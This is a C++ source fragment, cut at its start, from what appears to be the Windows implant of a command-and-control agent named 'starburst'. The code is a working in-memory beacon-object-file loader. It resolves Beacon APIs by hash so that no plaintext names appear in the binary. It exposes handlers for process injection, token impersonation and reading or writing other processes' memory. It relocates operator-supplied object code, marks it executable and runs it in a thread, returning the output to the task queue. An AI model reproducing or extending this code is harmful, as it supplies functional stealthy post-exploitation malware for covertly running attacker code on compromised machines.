    int       args_len;
    instance* inst;
};

static DWORD WINAPI declfn bof_thread_fn( LPVOID param ) {
    auto ctx = static_cast<bof_run_ctx*>( param );
    coff_set_inst( ctx->inst );
    ctx->inst->coff.bof_thread_id = get_current_tid();
    ctx->inst->coff.guard_active = 1;

    typedef void ( __cdecl *bof_entry )( char*, int );
    auto fn = reinterpret_cast<bof_entry>( ctx->entry );
    fn( ctx->args, ctx->args_len );

    ctx->inst->coff.guard_active = 0;
    return 0;
}

// FNV-1a hash for compile-time beacon API name matching
static constexpr uint32_t _fnv1a( const char* s ) {
    uint32_t h = 0x811c9dc5;
    while ( *s ) { h ^= (uint8_t)*s++; h *= 0x01000193; }
    return h;
}

static auto declfn _hash_name( const char* s ) -> uint32_t {
    uint32_t h = 0x811c9dc5;
    while ( *s ) { h ^= (uint8_t)*s++; h *= 0x01000193; }
    return h;
}

static auto declfn resolve_coff_symbol(
    instance& inst, const char* name
) -> void* {
    // match beacon API names by hash - no plaintext strings in binary
    uint32_t h = _hash_name( name );
    switch ( h ) {
        case _fnv1a("BeaconPrintf"):           return (void*)beacon_printf;
        case _fnv1a("BeaconOutput"):           return (void*)beacon_output;
        case _fnv1a("BeaconDataParse"):        return (void*)beacon_data_parse;
        case _fnv1a("BeaconDataInt"):          return (void*)beacon_data_int;
        case _fnv1a("BeaconDataShort"):        return (void*)beacon_data_short;
        case _fnv1a("BeaconDataExtract"):      return (void*)beacon_data_extract;
        case _fnv1a("BeaconDataLength"):       return (void*)beacon_data_length;
        case _fnv1a("BeaconFormatAlloc"):      return (void*)beacon_format_alloc;
        case _fnv1a("BeaconFormatReset"):      return (void*)beacon_format_reset;
        case _fnv1a("BeaconFormatFree"):       return (void*)beacon_format_free;
        case _fnv1a("BeaconFormatAppend"):     return (void*)beacon_format_append;
        case _fnv1a("BeaconFormatPrintf"):     return (void*)beacon_format_printf;
        case _fnv1a("BeaconFormatToString"):   return (void*)beacon_format_tostring;
        case _fnv1a("BeaconFormatInt"):        return (void*)beacon_format_int;
        case _fnv1a("BeaconIsAdmin"):          return (void*)beacon_is_admin;
        case _fnv1a("BeaconGetSpawnTo"):       return (void*)beacon_get_spawn_to;
        case _fnv1a("BeaconCleanupProcess"):   return (void*)beacon_cleanup_thread;
        case _fnv1a("BeaconDataPtr"):          return (void*)beacon_data_ptr;
        case _fnv1a("BeaconDownload"):         return (void*)beacon_download;
        case _fnv1a("BeaconUseToken"):         return (void*)beacon_use_token;
        case _fnv1a("BeaconRevertToken"):      return (void*)beacon_revert_token;
        case _fnv1a("BeaconInjectProcess"):    return (void*)beacon_inject_process;
        case _fnv1a("BeaconInjectTemporaryProcess"): return (void*)beacon_inject_temp_process;
        case _fnv1a("BeaconSpawnTemporaryProcess"):  return (void*)beacon_spawn_temp_process;
        case _fnv1a("toWideChar"):             return (void*)beacon_to_wide_char;
        case _fnv1a("BeaconInformation"):      return (void*)beacon_information;
        case _fnv1a("BeaconAddValue"):         return (void*)beacon_add_value;
        case _fnv1a("BeaconGetValue"):         return (void*)beacon_get_value;
        case _fnv1a("BeaconRemoveValue"):      return (void*)beacon_remove_value;
        case _fnv1a("BeaconDataStoreGetItem"):       return (void*)beacon_data_store_get_item;
        case _fnv1a("BeaconDataStoreProtectItem"):   return (void*)beacon_data_store_protect_item;
        case _fnv1a("BeaconDataStoreUnprotectItem"): return (void*)beacon_data_store_unprotect_item;
        case _fnv1a("BeaconDataStoreMaxEntries"):    return (void*)beacon_data_store_max_entries;
        case _fnv1a("BeaconGetCustomUserData"):      return (void*)beacon_get_custom_user_data;
        case _fnv1a("BeaconGetSyscallInformation"):  return (void*)beacon_get_syscall_info;
        case _fnv1a("BeaconVirtualAlloc"):     return (void*)beacon_virtual_alloc;
        case _fnv1a("BeaconVirtualAllocEx"):   return (void*)beacon_virtual_alloc_ex;
        case _fnv1a("BeaconVirtualProtect"):   return (void*)beacon_virtual_protect;
        case _fnv1a("BeaconVirtualProtectEx"): return (void*)beacon_virtual_protect_ex;
        case _fnv1a("BeaconVirtualFree"):      return (void*)beacon_virtual_free;
        case _fnv1a("BeaconGetThreadContext"):  return (void*)beacon_get_thread_context;
        case _fnv1a("BeaconSetThreadContext"):  return (void*)beacon_set_thread_context;
        case _fnv1a("BeaconResumeThread"):      return (void*)beacon_resume_thread;
        case _fnv1a("BeaconOpenProcess"):       return (void*)beacon_open_process;
        case _fnv1a("BeaconOpenThread"):        return (void*)beacon_open_thread;
        case _fnv1a("BeaconCloseHandle"):       return (void*)beacon_close_handle;
        case _fnv1a("BeaconUnmapViewOfFile"):   return (void*)beacon_unmap_view_of_file;
        case _fnv1a("BeaconVirtualQuery"):      return (void*)beacon_virtual_query;
        case _fnv1a("BeaconDuplicateHandle"):   return (void*)beacon_duplicate_handle;
        case _fnv1a("BeaconReadProcessMemory"): return (void*)beacon_read_process_memory;
        case _fnv1a("BeaconWriteProcessMemory"):return (void*)beacon_write_process_memory;
        case _fnv1a("BeaconDisableBeaconGate"):  return (void*)beacon_disable_gate;
        case _fnv1a("BeaconEnableBeaconGate"):   return (void*)beacon_enable_gate;
        case _fnv1a("BeaconDisableMasking"):     return (void*)beacon_disable_gate_masking;
        case _fnv1a("BeaconEnableMasking"):      return (void*)beacon_enable_gate_masking;
    }

    if ( name[0] == '_' && name[1] == '_' && name[2] == 'i' && name[3] == 'm' && name[4] == 'p' && name[5] == '_' ) {
        return resolve_coff_symbol( inst, name + 6 );
    }

    char mod_name[64] = { 0 };
    char func_name[128] = { 0 };

    const char* dollar = name;
    while ( *dollar && *dollar != '$' ) dollar++;

    if ( *dollar == '$' ) {
        uint32_t mod_len = (uint32_t)(dollar - name);
        if ( mod_len < 59 ) {
            memory::copy( mod_name, const_cast<char*>(name), mod_len );
            mod_name[mod_len] = '.'; mod_name[mod_len+1] = 'd';
            mod_name[mod_len+2] = 'l'; mod_name[mod_len+3] = 'l';
            mod_name[mod_len+4] = '\0';
        }
        uint32_t func_len = str_len( const_cast<char*>( dollar + 1 ) );
        if ( func_len < 127 ) {
            memory::copy( func_name, const_cast<char*>(dollar + 1), func_len );
        }

        auto h_mod = inst.kernel32.LoadLibraryA( mod_name );
        if ( h_mod ) {
            auto addr = inst.kernel32.GetProcAddress( h_mod, func_name );
            if ( addr ) return (void*)addr;
        }
    }

    DBG_PRINT( inst, "COFF: unresolved symbol: %s\n", name );
    return nullptr;
}

auto declfn starburst::cmd_execute_coff(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t coff_len = 0;
    auto coff_data = parser_bytes( params, &coff_len );
    uint32_t args_len = 0;
    auto args_data = parser_bytes( params, &args_len );
    uint32_t entry_len = 0;
    auto entry_name = parser_string( params, &entry_len );

    if ( !coff_data || coff_len < sizeof(COFF_FILE_HEADER) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no COFF data" ) ) );
        return;
    }

    char entry_buf[64] = { 0 };
    if ( entry_name && entry_len > 0 ) {
        memory::copy( entry_buf, entry_name, entry_len < 63 ? entry_len : 63 );
    } else {
        entry_buf[0] = 'g'; entry_buf[1] = 'o'; entry_buf[2] = '\0';
    }

    DBG_PRINT( inst, "cmd_execute_coff: %u bytes, entry=%s, args=%u bytes\n",
        coff_len, entry_buf, args_len );

    auto header = reinterpret_cast<COFF_FILE_HEADER*>( coff_data );
    auto sections = reinterpret_cast<COFF_SECTION*>(
        coff_data + sizeof(COFF_FILE_HEADER) + header->SizeOfOptionalHeader );
    auto symbols = reinterpret_cast<COFF_SYMBOL*>(
        coff_data + header->PointerToSymbolTable );
    auto string_table = reinterpret_cast<char*>(
        symbols + header->NumberOfSymbols );

    auto section_ptrs = static_cast<uint8_t**>(
        inst.heap_alloc( header->NumberOfSections * sizeof(uint8_t*) ) );
    if ( !section_ptrs ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    // calculate total size: sections (page-aware aligned) + trampolines + IAT
    // trampolines: 12 bytes each (mov rax,imm64 + jmp rax), one per symbol max
    // IAT must be co-located so REL32 relocations from BOF code can reach it
    //
    // page-align after executable sections so VirtualProtect(RX) on .text
    // does not accidentally make writable sections (.data/.bss) read-only
    uint32_t total_alloc = 0;
    uint32_t sec_offsets[256] = { 0 };
    uint32_t sec_sizes[256] = { 0 };
    for ( uint16_t i = 0; i < header->NumberOfSections && i < 256; i++ ) {
        sec_sizes[i] = sections[i].SizeOfRawData;
        if ( sec_sizes[i] == 0 ) sec_sizes[i] = sections[i].VirtualSize;
        if ( sec_sizes[i] == 0 ) sec_sizes[i] = 64;

        if ( i > 0 && ( sections[i - 1].Characteristics & 0x20000000 ) &&
             !( sections[i].Characteristics & 0x20000000 ) ) {
            total_alloc = ( total_alloc + 0xFFF ) & ~0xFFFu;
        }

        sec_offsets[i] = total_alloc;
        total_alloc += ( sec_sizes[i] + 15 ) & ~15u;
    }
    total_alloc = ( total_alloc + 0xFFF ) & ~0xFFFu;
    uint32_t tramp_offset = total_alloc;
    total_alloc += header->NumberOfSymbols * 12;
    uint32_t imp_offset = ( total_alloc + 7 ) & ~7u;
    total_alloc = imp_offset + header->NumberOfSymbols * sizeof(void*);

    auto coff_base = static_cast<uint8_t*>(
        inst.kernel32.VirtualAlloc(
            nullptr, total_alloc,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
    if ( !coff_base ) {
        inst.heap_free( section_ptrs );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "section alloc failed" ) ) );
        return;
    }

    for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
        section_ptrs[i] = coff_base + sec_offsets[i];
        if ( sections[i].SizeOfRawData > 0 ) {
            memory::copy( section_ptrs[i],
                coff_data + sections[i].PointerToRawData,
                sections[i].SizeOfRawData );
        }
    }

    auto tramp_ptr = coff_base + tramp_offset;
    uint32_t tramp_used = 0;

    auto imp_table = reinterpret_cast<void**>( coff_base + imp_offset );

    auto func_ptrs = static_cast<void**>(
        inst.heap_alloc( header->NumberOfSymbols * sizeof(void*) ) );
    if ( !func_ptrs ) {
        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
        inst.heap_free( section_ptrs );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    memory::zero( func_ptrs, header->NumberOfSymbols * sizeof(void*) );

    void* entry_ptr = nullptr;

    for ( uint32_t i = 0; i < header->NumberOfSymbols; i++ ) {
        char sym_name[256] = { 0 };
        if ( symbols[i].Name.Zeroes == 0 ) {
            auto long_name = string_table + symbols[i].Name.Offset;
            uint32_t nlen = str_len( long_name );
            memory::copy( sym_name, long_name, nlen < 255 ? nlen : 255 );
        } else {
            memory::copy( sym_name, symbols[i].ShortName, 8 );
        }

        if ( symbols[i].SectionNumber > 0 ) {
            uint16_t sec_idx = symbols[i].SectionNumber - 1;
            func_ptrs[i] = section_ptrs[sec_idx] + symbols[i].Value;

            if ( str_cmp( sym_name, entry_buf ) == 0 ||
                 ( sym_name[0] == '_' && str_cmp( sym_name + 1, entry_buf ) == 0 ) ) {
                entry_ptr = func_ptrs[i];
                DBG_PRINT( inst, "COFF: entry '%s' at %p\n", sym_name, entry_ptr );
            }
        } else if ( symbols[i].SectionNumber == 0 && symbols[i].StorageClass == 2 ) {
            bool is_imp = sym_name[0] == '_' && sym_name[1] == '_' &&
                          sym_name[2] == 'i' && sym_name[3] == 'm' &&
                          sym_name[4] == 'p' && sym_name[5] == '_';
            void* resolved = resolve_coff_symbol( inst, sym_name );
            DBG_PRINT( inst, "COFF: sym[%u] '%s' imp=%d resolved=%p\n",
                i, sym_name, is_imp ? 1 : 0, resolved );
            if ( is_imp && resolved ) {
                imp_table[i] = resolved;
                func_ptrs[i] = &imp_table[i];
            } else if ( resolved ) {
                // non-__imp_ external: create trampoline (mov rax,addr; jmp rax)
                // so REL32 relocations stay within ±2GB of BOF sections
                auto t = tramp_ptr + tramp_used * 12;
                t[0] = 0x48; t[1] = 0xB8;
                *reinterpret_cast<uint64_t*>( t + 2 ) =
                    reinterpret_cast<uint64_t>( resolved );
                t[10] = 0xFF; t[11] = 0xE0;
                func_ptrs[i] = t;
                tramp_used++;
            } else {
                func_ptrs[i] = nullptr;
            }
        } else {
            func_ptrs[i] = nullptr;
        }

        i += symbols[i].NumberOfAuxSymbols;
    }

    if ( !entry_ptr ) {
        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
        inst.heap_free( section_ptrs );
        inst.heap_free( func_ptrs );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "entry point not found" ) ) );
        return;
    }

    // process relocations
    for ( uint16_t s = 0; s < header->NumberOfSections; s++ ) {
        if ( sections[s].NumberOfRelocations == 0 ) continue;

        auto relocs = reinterpret_cast<COFF_RELOCATION*>(
            coff_data + sections[s].PointerToRelocations );

        for ( uint16_t r = 0; r < sections[s].NumberOfRelocations; r++ ) {
            uint32_t sym_idx = relocs[r].SymbolTableIndex;
            auto target = section_ptrs[s] + relocs[r].VirtualAddress;

            uintptr_t sym_addr = reinterpret_cast<uintptr_t>( func_ptrs[sym_idx] );
            if ( !sym_addr ) continue;

            switch ( relocs[r].Type ) {
                case IMAGE_REL_AMD64_ADDR64:
                    *reinterpret_cast<uint64_t*>( target ) += sym_addr;
                    break;
                case IMAGE_REL_AMD64_ADDR32NB:
                    *reinterpret_cast<uint32_t*>( target ) += static_cast<uint32_t>(
                        sym_addr - reinterpret_cast<uintptr_t>( coff_base ) );
                    break;
                case IMAGE_REL_AMD64_REL32:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 4 );
                    break;
                case IMAGE_REL_AMD64_REL32_1:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 5 );
                    break;
                case IMAGE_REL_AMD64_REL32_2:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 6 );
                    break;
                case IMAGE_REL_AMD64_REL32_3:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 7 );
                    break;
                case IMAGE_REL_AMD64_REL32_4:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 8 );
                    break;
                case IMAGE_REL_AMD64_REL32_5:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 9 );
                    break;
            }
        }
    }

    // set .text sections and trampoline area to RX
    for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
        if ( sections[i].Characteristics & 0x20000000 ) {
            DWORD old_protect;
            inst.kernel32.VirtualProtect( section_ptrs[i], sec_sizes[i],
                PAGE_EXECUTE_READ, &old_protect );
        }
    }
    if ( tramp_used > 0 ) {
        DWORD old_protect;
        inst.kernel32.VirtualProtect( tramp_ptr, tramp_used * 12,
            PAGE_EXECUTE_READ, &old_protect );
    }

    // setup COFF output via instance
    inst.coff.output_data = static_cast<char*>( inst.heap_alloc( 4096 ) );
    inst.coff.output_length = 0;
    inst.coff.output_capacity = 4096;
    inst.coff.crash_code = 0;
    inst.coff.guard_active = 0;
    if ( inst.coff.output_data ) inst.coff.output_data[0] = '\0';

    // resolve VEH + ExitThread for crash isolation
    auto pAddVEH = reinterpret_cast<decltype(RtlAddVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlAddVectoredExceptionHandler" ) ) );
    auto pRemoveVEH = reinterpret_cast<decltype(RtlRemoveVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlRemoveVectoredExceptionHandler" ) ) );

    inst.coff.exit_thread_addr = reinterpret_cast<uintptr_t>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlExitUserThread" ) ) );

    void* veh = nullptr;
    if ( pAddVEH && inst.coff.exit_thread_addr ) {
        veh = pAddVEH( 1,
            reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>( bof_crash_handler ) );
    }

    DBG_PRINT( inst, "COFF: calling entry at %p, args=%p len=%u veh=%p\n",
        entry_ptr, args_data, args_len, veh );

    bool bof_ok = false;

    bof_run_ctx bctx = { entry_ptr,
        reinterpret_cast<char*>( args_data ), static_cast<int>( args_len ), &inst };

    HANDLE h_bof = inst.kernel32.CreateThread(
        nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>( bof_thread_fn ),
        &bctx, 0, nullptr );

    if ( h_bof ) {
        DWORD wait = inst.kernel32.WaitForSingleObject( h_bof, 60000 );
        DWORD exit_code = 0;
        inst.kernel32.GetExitCodeThread( h_bof, &exit_code );

        if ( wait == WAIT_TIMEOUT ) {
            inst.kernel32.TerminateThread( h_bof, 1 );
            DBG_PRINT( inst, "COFF: BOF timed out after 60s\n" );
        } else if ( exit_code == 0 ) {
            bof_ok = true;
        } else {
            DBG_PRINT( inst, "COFF: BOF crashed with 0x%08X\n", exit_code );
        }

        inst.kernel32.CloseHandle( h_bof );
    } else {
        instance* old_aup = coff_get_inst();
        coff_set_inst( &inst );

        typedef void ( __cdecl *bof_entry )( char*, int );
        auto go_fn = reinterpret_cast<bof_entry>( entry_ptr );
        go_fn( reinterpret_cast<char*>( args_data ), args_len );

        coff_set_inst( old_aup );
        bof_ok = true;
    }

    if ( veh && pRemoveVEH )
        pRemoveVEH( veh );

    DBG_PRINT( inst, "COFF: done ok=%d crash=0x%08X\n", bof_ok, inst.coff.crash_code );

    if ( bof_ok && inst.coff.output_data && inst.coff.output_length > 0 ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS, inst.coff.output_data );
    } else if ( bof_ok ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "executed (no output)" ) ) );
    } else if ( inst.coff.crash_code ) {
        char err[32] = { 'B','O','F',' ','c','r','a','s','h',':',' ','0','x' };
        uint32_t code = inst.coff.crash_code;
        for ( int d = 7; d >= 0; d-- ) {
            uint32_t n = ( code >> ( d * 4 ) ) & 0xF;
            err[13 + (7 - d)] = n < 10 ? '0' + n : 'A' + n - 10;
        }
        err[21] = '\0';
        queue_response( inst, task_uuid, RESPONSE_ERROR, err );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "BOF timed out" ) ) );
    }

    if ( inst.coff.output_data ) inst.heap_free( inst.coff.output_data );
    if ( inst.coff.info_heap_buf ) inst.heap_free( inst.coff.info_heap_buf );
    inst.coff = {};

    inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
    inst.heap_free( section_ptrs );
    inst.heap_free( func_ptrs );
}

#endif
